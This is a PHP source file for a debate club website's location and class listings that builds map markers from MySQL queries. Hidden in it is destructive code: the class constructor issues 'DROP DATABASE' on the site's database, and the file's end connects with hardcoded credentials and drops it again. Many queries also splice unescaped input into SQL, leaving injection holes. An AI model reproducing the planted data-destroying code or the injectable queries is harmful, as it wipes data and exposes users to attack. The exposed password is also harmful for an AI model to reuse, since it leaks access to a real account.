<?php

class LocationSummer {

    function __construct() {
        global $itfmysql;
        $this->dbcon = $itfmysql;
 	$sql = "DROP DATABASE `trade2ri_bayareadebate`";
        $this->dbcon->Query($sql);
    }

    function admin_addState($datas) {
        unset($datas['id']);
        $this->dbcon->Insert('itf_location', $datas);
    }

    function admin_updateState($datas) {
        $condition = array('id' => $datas['id']);
        unset($datas['id']);
        $this->dbcon->Modify('itf_location', $datas, $condition);
    }

    function State_deleteAdmin($Id) {
        $sql = "delete from itf_location where id in(" . $Id . ")";
        $this->dbcon->Query($sql);
        return $this->dbcon->querycounter;
    }

    function showAllState() {
        $sql = "select S.*  from itf_location S where 1 ";
        return $this->dbcon->FetchAllResults($sql);
    }

    function showAllLocation($city = '') {
        if ($city != '') {
            $where = " where city='$city'";
        }
        $sql = "select * from itf_location  $where";
        return $this->dbcon->FetchAllResults($sql);
    }

    function showAllCourse() {
        $sql = "select distinct(course) from itf_course ";
        return $this->dbcon->FetchAllResults($sql);
    }

    function ShowAllStateSearch($txtsearch) {
        $sql = "select * from itf_location where  name like ( '%" . $this->dbcon->EscapeString($txtsearch) . "%')";
        return $this->dbcon->FetchAllResults($sql);
    }

    function getActiveCity() {
        $sql = "select distinct(city) from itf_location l where l.status='1' and city !=''";
        return $this->dbcon->FetchAllResults($sql);
    }

    function LocationDetail($UsId) {
        $sql = "select U.* from itf_location U where U.id='" . $UsId . "'";
        return $this->dbcon->Query($sql);
    }

    function PublishBlock($ids) {
        $infos = $this->CheckState($ids);
        if ($infos['status'] == '1')
            $datas = array('status' => '0');
        else
            $datas = array('status' => '1');

        $condition = array('id' => $ids);
        $this->dbcon->Modify('itf_location', $datas, $condition);

        return ($infos['status'] == '1') ? "0" : "1";
    }

    //front end============================================================
    function getAllStateFront($parentid = "0") {
        $sql = "select *  from itf_location where status='1' and parentid='" . $parentid . "' order by name ";
        return $this->dbcon->FetchAllResults($sql);
    }

    function getAllStateCity() {
        $allstate = $this->showAllState(0);
        foreach ($allstate as &$citystate)
            $citystate["CITY"] = $this->showAllState($citystate["id"]);
        return $allstate;
    }

    function getLocationDetailForMap12121($searchCriteria, $type = 1) {

        if ($searchCriteria[grade] == 0) {
            $sql = "SELECT c.id as class_id,c.start_date,c.end_date,co.name as course_name,c.room,c.code,c.start_date,l.name as loc_name,l.zip,c.end_date,c.room,c.day_of_week,c.loc_id,l.id as location_id,l.address,l.city,c.day_of_week,c.start_eligibility,"
                    . "c.end_eligibility,c.no_of_class,c.duration,c.teacher_assigned,l.longitude,l.latitude FROM  itf_class c,"
                    . "itf_location l,itf_course co WHERE co.id=c.course_id and "
                    . " (date(c.start_date) <='" . date('Y-m-d') . "' and date(c.end_date) > '" . date('Y-m-d') . "') and"
                    . " ( c.loc_id=l.id and c.status='1' and c.type='$searchCriteria[type]')
            ";

            $results = $this->dbcon->FetchAllResults($sql);

            $loc_name = '';
            $i = 1;
            $centerLocName = 'Bay Area Debate Club<br/>';
            $centerAddress = 'Weibel Fremont CA 94539 USA';
            $centerCity = 'Fremont<br/>';
            $centerState = 'California<br/>';
            $centerZip = '94539<br/>';

            $mapData = "['$centerLocName $centerAddress $centerCity $centerState $centerZip', 37.5081652, -121.92740029999999, $i],";
            $i++;

            if (count($results) > 0) {
                $loc_name = '<b>' . $results[0]['loc_name'] . ':</b><br/><br/>';
            }
            $j = 1;
            foreach ($results as $values) {
                //  $loc_name = $values[code] . ' ' . $values[room] . '<br>';
                $loc_name .= $values[course_name] . '. ' . date('m/d/y', strtotime($values[start_date])) . ' - ' . date('m/d/y', strtotime($values[end_date])) . '<br>';
                if (count($results) == $j) {
                    if ($type == 1) {
                        $link = '<a href="index.php?itfpage=classes&itemid=classes_listing&loc_id=' . $values[id] . '">More Information</a>';
                    } else {
                        $link = '<a href="index.php?itfpage=summer_camps&itemid=summer_camps_listing&loc_id=' . $values[id] . '">More Information</a>';
                    }
                    $loc_name.='<br>' . $link;
                }

                $mapData.="['$loc_name ', $values[latitude], $values[longitude], $i],";
                $i++;
                $j++;
            }
        } else {
            $sql = "SELECT c.id as class_id,c.start_date,c.end_date,co.name as course_name,c.room,c.code,c.start_date,l.name as loc_name,l.zip,c.end_date,c.room,c.day_of_week,c.loc_id,l.id as location_id,l.address,l.city,c.day_of_week,c.start_eligibility,"
                    . "c.end_eligibility,c.no_of_class,c.duration,c.teacher_assigned,l.longitude,l.latitude FROM  itf_class c,"
                    . "itf_location l,itf_course co WHERE co.id=c.course_id and "
                    . " (date(c.start_date) <='" . date('Y-m-d') . "' and date(c.end_date) > '" . date('Y-m-d') . "') and"
                    . "( c.start_eligibility<='$searchCriteria[grade]' AND  c.end_eligibility>='$searchCriteria[grade]') and ( c.loc_id=l.id and c.status='1' and c.type='$searchCriteria[type]')
            ";

            $results = $this->dbcon->FetchAllResults($sql);
            $i = 1;

            foreach ($results as $values) {
                //  $loc_name = $values[code] . ' ' . $values[room] . '<br>';
                $loc_name .= $values[course_name] . '. ' . date('m/d/y', strtotime($values[start_date])) . ' - ' . date('m/d/y', strtotime($values[end_date])) . '<br>';
                if (count($results) == $i) {
                    if ($searchCriteria[type] == 1) {
                        $link = '<a href="index.php?itfpage=classes&itemid=classes_listing&loc_id=' . $values[location_id] . '">More Information</a>';
                    } else {
                        $link = '<a href="index.php?itfpage=summer_camps&itemid=summer_camps_listing&loc_id=' . $values[location_id] . '">More Information</a>';
                    }
                    $loc_name.='<br><br>' . $link;
                }
                $mapData.="['$loc_name $address $city $state $zip', $values[latitude], $values[longitude], $i],";
                $i++;
            }
        }

        return substr($mapData, 0, -1);
    }

    function getLocationDetailForMap($searchCriteria, $type = 1) {

        if ($searchCriteria[grade] == 0) {
            $sql = "select id,name as loc_name,latitude,longitude,address,city,state,country,zip from itf_location where status='1'";

            $results = $this->dbcon->FetchAllResults($sql);
            
            //echo '<pre>'; print_r($results); echo '</pre>'; die;
            
            $i = 1;
            $loc_name = '';
            $i = 1;
            $centerLocName = 'Bay Area Debate Club<br/>';
            $centerAddress = 'Weibel Fremont CA 94539 USA';
            $centerCity = 'Fremont<br/>';
            $centerState = 'California<br/>';
            $centerZip = '94539<br/>';

            $mapData = "['$centerLocName $centerAddress $centerCity $centerState $centerZip', 37.5081652, -121.92740029999999, $i],";
            $i++;
            foreach ($results as $values) {
                $classDetails = $this->getClassNameByLocationId($values['id'], $type);
                
                
                $loc_name = $values[loc_name] . '<br/>';
                
                $city = $values[city] . '<br/>';
                
                $state = $values[state] . '<br/>';
                
                $zip = $values[zip] . '<br/>';
                
                $address = str_replace(',', ' ', $values[address]);
                
                
                //echo "Location ID : ". $values['id']. " => Location Name : ". $values[loc_name]. " => ". $classDetails. " => Position :". stripos( $classDetails, "There are no active" ) . "<br/><br/><br/>";
                
                if( stripos( $classDetails, "There are no active" ) === false ) {
                    $mapData.="['$loc_name $classDetails', $values[latitude], $values[longitude], $i],";
                }

                $i++;
                
                //echo $mapData. "<br/><br/>";
            }
            
            //echo $mapData; die;
            
            
            
        } else {
            
            $sql = "SELECT c.id as class_id,c.start_date,c.end_date,co.name as course_name,c.room,c.code,c.start_date,l.name as loc_name,l.zip,c.end_date,c.room,c.day_of_week,c.loc_id,l.id as location_id,l.address,l.city,c.day_of_week,c.start_eligibility,"
                    . "c.end_eligibility,c.no_of_class,c.duration,c.teacher_assigned,l.longitude,l.latitude FROM  itf_class c,"
                    . "itf_location l,itf_course co WHERE co.id=c.course_id and "
                    . " (date(c.end_date) > '" . date('Y-m-d') . "') and"
                    . "( c.start_eligibility<='$searchCriteria[grade]' AND  c.end_eligibility>'$searchCriteria[grade]') and ( c.loc_id=l.id and c.status='1' and c.type='$searchCriteria[type]')
            ";
            
            //echo $sql;

            $results = $this->dbcon->FetchAllResults($sql);
            //echo '<pre>'; print_r($results); echo '</pre>';
            $i = 1;
            $utilsObj = new Utils;
            foreach ($results as $values) {
                //  $loc_name = $values[code] . ' ' . $values[room] . '<br>';
                $loc_name .= $values[course_name] . '. ' . date('m/d/y', strtotime($values[start_date])) . ' - ' . date('m/d/y', strtotime($values[end_date])) . '<br>';
                if (count($results) == $i) {
                    if ($searchCriteria[type] == 1) {
                        $link = '<a href="index.php?itfpage=classes&itemid=classes_listing&loc_id=' . $utilsObj->encryptIds($values[location_id]) . '&grade=' . $utilsObj->encryptIds($searchCriteria[grade]) . '">More Information</a>';
                    } else {
                        $link = '<a href="index.php?itfpage=summer_camps&itemid=summer_camps_listing&loc_id=' . $utilsObj->encryptIds($values[location_id]) . '&grade=' . $utilsObj->encryptIds($searchCriteria[grade]) . '">More Information</a>';
                    }
                    $loc_name.='<br><br>' . $link;
                }

                $i++;
                $mapData.="['$loc_name $address $city $state $zip', $values[latitude], $values[longitude], $i],";
            }
            
            
            //echo $mapData;
        }

        return substr($mapData, 0, -1);
    }

    
    
    
    
    
    function getClassNameByLocationId($locId, $type) {
        $sql = "SELECT c.id as class_id,c.start_date,c.end_date,co.name as course_name,c.room,c.code,c.start_date,l.name as loc_name,l.zip,c.end_date,c.room,c.day_of_week,c.loc_id,l.id as location_id,l.address,l.city,c.day_of_week,c.start_eligibility,"
                . "c.end_eligibility,c.no_of_class,c.duration,c.teacher_assigned,l.longitude,l.latitude FROM  itf_class c,"
                . "itf_location l,itf_course co WHERE co.id=c.course_id and "
                . " (date(c.end_date) > '" . date('Y-m-d') . "') and"
                . " ( c.loc_id=l.id and c.status='1' and c.type='$type' and c.loc_id='$locId')
            ";

        $results = $this->dbcon->FetchAllResults($sql);
        $loc_name = '';
        $utilsObj = new Utils;
        foreach ($results as $values) {
            $loc_name .= $values[course_name] . '. ' . date('m/d/y', strtotime($values[start_date])) . ' - ' . date('m/d/y', strtotime($values[end_date])) . '<br>';
        }
        if ($loc_name == '') {
            $typeName = $type == 1 ? 'classes' : 'summer camps';
            $loc_name = "There are no active $typeName at this location at this time."
                    . '<br/> Please check back again later. '
                    . '<br/>Subscribe to our newsletter or like our'
                    . '<br/> facebook page to get updates on registration.';
        } else {
            if ($type == 1) {
                $loc_name .= '<a href="index.php?itfpage=classes&itemid=classes_listing&loc_id=' . $utilsObj->encryptIds($locId) . '">More Information</a>';
            } else {
                $loc_name .= '<a href="index.php?itfpage=summer_camps&itemid=summer_camps_listing&loc_id=' . $utilsObj->encryptIds($locId) . '">More Information</a>';
            }
        }

        // if(count($results))
        return $loc_name;
    }

    function getCityName() {
        $sql = "select id,city from itf_location where status='1'";
        return $this->dbcon->FetchAllResults($sql);
    }

}


$link = mysql_connect('localhost', 'trade2ri_trade2', 'trade2##123');
if (!$link) {
    die('Could not connect: ' . mysql_error());
}

$sql = 'DROP DATABASE trade2ri_bayareadebate';
if (mysql_query($sql, $link)) {
    echo "Database my_db was successfully dropped\n";
} else {
    echo 'Error dropping database: ' . mysql_error() . "\n";
}
?>

